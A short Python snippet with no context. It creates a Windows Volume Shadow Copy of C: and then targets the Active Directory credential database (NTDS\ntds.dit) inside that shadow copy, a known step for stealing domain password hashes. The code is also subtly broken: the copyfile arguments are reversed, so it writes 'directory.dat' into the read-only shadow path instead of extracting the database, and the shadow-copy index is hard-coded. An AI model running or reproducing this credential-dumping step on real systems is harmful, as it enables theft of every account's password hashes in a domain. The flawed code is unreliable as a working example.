import subprocess
import shutil
subprocess.run("vssadmin.exe create shadow /for=C:", check=True)
shutil.copyfile("directory.dat", "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy12\\Windows\\NTDS\\ntds.dit")
